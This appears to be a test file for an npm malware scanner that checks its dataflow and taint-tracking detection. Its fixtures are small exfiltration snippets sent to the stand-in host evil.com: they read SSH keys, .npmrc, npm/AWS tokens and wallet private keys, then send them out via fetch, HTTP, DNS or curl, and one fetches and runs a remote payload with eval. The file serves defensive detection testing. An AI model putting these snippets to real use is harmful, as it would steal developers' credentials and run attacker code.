const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, asyncTest, assert, assertIncludes, runScan, runScanDirect, cleanupTemp, TESTS_DIR } = require('../test-utils');

function makeTempPkg(jsContent, fileName = 'index.js') {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-df-'));
  fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-pkg', version: '1.0.0' }));
  fs.writeFileSync(path.join(tmp, fileName), jsContent);
  return tmp;
}

async function runDataflowTests() {
  console.log('\n=== DATAFLOW TESTS ===\n');

  test('DATAFLOW: Detects credential read + network send', () => {
    const output = runScan(path.join(TESTS_DIR, 'dataflow'));
    assertIncludes(output, 'Suspicious flow', 'Should detect suspicious flow');
  });

  test('DATAFLOW: Detects env read + fetch', () => {
    const output = runScan(path.join(TESTS_DIR, 'dataflow'));
    assertIncludes(output, 'CRITICAL', 'Should be CRITICAL');
  });

  // --- Dynamic env bracket access ---

  await asyncTest('DATAFLOW: Detects dynamic process.env[variable] as source', async () => {
    const tmp = makeTempPkg(`const key = 'TOKEN';\nconst val = process.env[key];\nfetch('http://evil.com?d=' + val);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect dynamic env access + network send');
    } finally { cleanupTemp(tmp); }
  });

  // --- .secretKey / .privateKey credential source ---

  await asyncTest('DATAFLOW: Detects .secretKey property as credential source', async () => {
    const tmp = makeTempPkg(`const sk = wallet.secretKey;\nfetch('http://evil.com', { body: sk });`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('secretKey'));
      assert(t, 'Should detect .secretKey as credential source');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('DATAFLOW: Detects .privateKey property as credential source', async () => {
    const tmp = makeTempPkg(`const pk = account.privateKey;\nfetch('http://evil.com', { body: pk });`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('privateKey'));
      assert(t, 'Should detect .privateKey as credential source');
    } finally { cleanupTemp(tmp); }
  });

  // --- dns.resolve as sink ---

  await asyncTest('DATAFLOW: Detects dns.resolve as exfiltration sink', async () => {
    const tmp = makeTempPkg(`const dns = require('dns');\nconst tok = process.env.SECRET_KEY;\ndns.resolve(tok + '.evil.com', () => {});`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('dns'));
      assert(t, 'Should detect dns.resolve as exfiltration sink');
    } finally { cleanupTemp(tmp); }
  });

  // --- http.request as sink ---

  await asyncTest('DATAFLOW: Detects http.request as network sink', async () => {
    const tmp = makeTempPkg(`const http = require('http');\nconst tok = process.env.NPM_TOKEN;\nhttp.request({ hostname: 'evil.com', path: '/' + tok });`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('http.request'));
      assert(t, 'Should detect http.request as network sink');
    } finally { cleanupTemp(tmp); }
  });

  // --- socket.connect as sink (requires net module import) ---

  await asyncTest('DATAFLOW: Detects socket.connect as sink with net import', async () => {
    const tmp = makeTempPkg(`const net = require('net');\nconst tok = process.env.AWS_SECRET_KEY;\nconst s = net.connect(80, 'evil.com');`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect socket.connect as network sink');
    } finally { cleanupTemp(tmp); }
  });

  // --- writeFileSync to sensitive path (file_tamper) ---

  await asyncTest('DATAFLOW: Detects writeFileSync to .npmrc as credential tampering', async () => {
    const tmp = makeTempPkg(`const fs = require('fs');\nconst data = process.env.NPM_TOKEN;\nfs.writeFileSync('/home/user/.npmrc', '//registry.npmjs.org/:_authToken=' + data);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'credential_tampering');
      assert(t, 'Should detect credential tampering via writeFileSync to .npmrc');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- eval() as sink ---

  await asyncTest('DATAFLOW: Detects eval as execution sink', async () => {
    const tmp = makeTempPkg(`const code = process.env.PAYLOAD;\neval(code);`);
    try {
      const result = await runScanDirect(tmp);
      // eval should be detected as a sink in dataflow
      const threats = result.threats;
      const hasEval = threats.some(t => t.type === 'suspicious_dataflow' || t.type === 'dangerous_call_eval');
      assert(hasEval, 'Should detect eval with env data');
    } finally { cleanupTemp(tmp); }
  });

  // --- Staged payload: network + eval ---

  await asyncTest('DATAFLOW: Detects staged payload (network fetch + eval)', async () => {
    const tmp = makeTempPkg(`const http = require('http');\nhttp.get('http://evil.com/payload', (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => eval(d)); });`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'staged_payload');
      assert(t, 'Should detect staged payload (network + eval)');
      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
    } finally { cleanupTemp(tmp); }
  });

  // --- Proximity severity ---

  await asyncTest('DATAFLOW: Close source/sink (<50 lines) is CRITICAL', async () => {
    const code = `const fs = require('fs');\nconst data = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');\nfetch('http://evil.com', { body: data });`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect suspicious dataflow');
      assert(t.severity === 'CRITICAL', 'Close source/sink should be CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('DATAFLOW: Distant source/sink (>50 lines) is HIGH', async () => {
    const lines = [];
    lines.push(`const fs = require('fs');`);
    lines.push(`const data = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');`);
    for (let i = 0; i < 60; i++) lines.push(`const x${i} = ${i};`);
    lines.push(`fetch('http://evil.com', { body: data });`);
    const tmp = makeTempPkg(lines.join('\n'));
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect suspicious dataflow');
      assert(t.severity === 'HIGH', 'Distant source/sink should be HIGH');
    } finally { cleanupTemp(tmp); }
  });

  // --- os.hostname/userInfo as fingerprint source ---

  await asyncTest('DATAFLOW: Detects os.hostname() + network as fingerprint exfil', async () => {
    const tmp = makeTempPkg(`const os = require('os');\nconst h = os.hostname();\nfetch('http://evil.com?h=' + h);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('hostname'));
      assert(t, 'Should detect os.hostname() as fingerprint source');
    } finally { cleanupTemp(tmp); }
  });

  // --- fs.readdirSync on sensitive dir ---

  await asyncTest('DATAFLOW: Detects readdirSync on .ssh directory as credential source', async () => {
    const tmp = makeTempPkg(`const fs = require('fs');\nconst files = fs.readdirSync('/home/user/.ssh');\nfetch('http://evil.com', { body: JSON.stringify(files) });`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect readdirSync on .ssh as credential source');
    } finally { cleanupTemp(tmp); }
  });

  // --- containsSensitiveLiteral: BinaryExpression recursion ---

  await asyncTest('DATAFLOW: Detects credential read from concatenated sensitive path', async () => {
    const tmp = makeTempPkg(`const fs = require('fs');\nconst data = fs.readFileSync('/home/' + '.ssh/id_rsa', 'utf8');\nfetch('http://evil.com', { body: data });`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect credential read from concatenated path');
    } finally { cleanupTemp(tmp); }
  });

  // --- isCredentialPath: variable ref ---

  await asyncTest('DATAFLOW: Detects credential read via tracked variable', async () => {
    const tmp = makeTempPkg(`const fs = require('fs');\nconst sshPath = '/home/user/.ssh/id_rsa';\nconst data = fs.readFileSync(sshPath, 'utf8');\nfetch('http://evil.com', { body: data });`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect credential read via variable tracking');
    } finally { cleanupTemp(tmp); }
  });

  // --- exec with curl/wget as sink ---

  await asyncTest('DATAFLOW: Detects execSync with curl as network sink', async () => {
    const tmp = makeTempPkg(`const { execSync } = require('child_process');\nconst tok = process.env.NPM_TOKEN;\nexecSync('curl http://evil.com -d token');`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect execSync with curl as network sink');
    } finally { cleanupTemp(tmp); }
  });

  // --- System identity env vars as fingerprint source ---

  await asyncTest('DATAFLOW: Detects process.env.USER + network send as suspicious_dataflow', async () => {
    const code = `
const http = require('http');
const data = JSON.stringify({ user: process.env.USER, hostname: require('os').hostname() });
const req = http.request({ hostname: 'evil.com', method: 'POST' });
req.write(data);
req.end();
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect process.env.USER exfil as suspicious_dataflow');
    } finally { cleanupTemp(tmp); }
  });

  // --- Intra-file taint tracking tests ---

  await asyncTest('TAINT: Aliased require("os") detected via taint tracking', async () => {
    const tmp = makeTempPkg(`const myOs = require("os");\nconst h = myOs.homedir();\nfetch("http://evil.com?d=" + h);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect aliased os.homedir() via taint tracking');
      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
      assertIncludes(t.message, 'os.homedir', 'Message should include os.homedir');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('TAINT: Destructured child_process exec detected', async () => {
    const tmp = makeTempPkg(`const { execSync } = require("child_process");\nconst tok = process.env.NPM_TOKEN;\nexecSync("curl http://evil.com -d " + tok);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect destructured execSync with curl as sink');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('TAINT: Chained assignment from aliased os', async () => {
    const tmp = makeTempPkg(`const myOs = require("os");\nconst h = myOs.homedir();\nconst data = h;\nfetch("http://evil.com?d=" + data);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect chained aliased os.homedir() via taint tracking');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('TAINT: Aliased process.env detected', async () => {
    const tmp = makeTempPkg(`const env = process.env;\nconst tok = env.NPM_TOKEN;\nfetch("http://evil.com?t=" + tok);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect aliased process.env access');
      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
      assertIncludes(t.message, 'NPM_TOKEN', 'Message should include NPM_TOKEN');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('TAINT: Safe module (path) does NOT trigger taint', async () => {
    const tmp = makeTempPkg(`const p = require("path");\nconst result = p.join("/a", "b");\nconsole.log(result);`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(!t, 'Should NOT detect suspicious_dataflow for safe module path');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('TAINT: Aliased fs.readFileSync on sensitive path detected', async () => {
    const tmp = makeTempPkg(`const myFs = require("fs");\nconst data = myFs.readFileSync("/home/user/.npmrc", "utf8");\nfetch("http://evil.com", { body: data });`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect aliased fs.readFileSync on .npmrc');
      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('TAINT: Aliased https sink detected', async () => {
    const tmp = makeTempPkg(`const h = require("https");\nconst tok = process.env.SECRET_KEY;\nh.request({ hostname: "evil.com", path: "/" + tok });`);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
      assert(t, 'Should detect aliased https.request as network sink');
      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
      assertIncludes(t.message, 'https.request', 'Message should include https.request');
    } finally { cleanupTemp(tmp); }
  });
}

module.exports = { runDataflowTests };
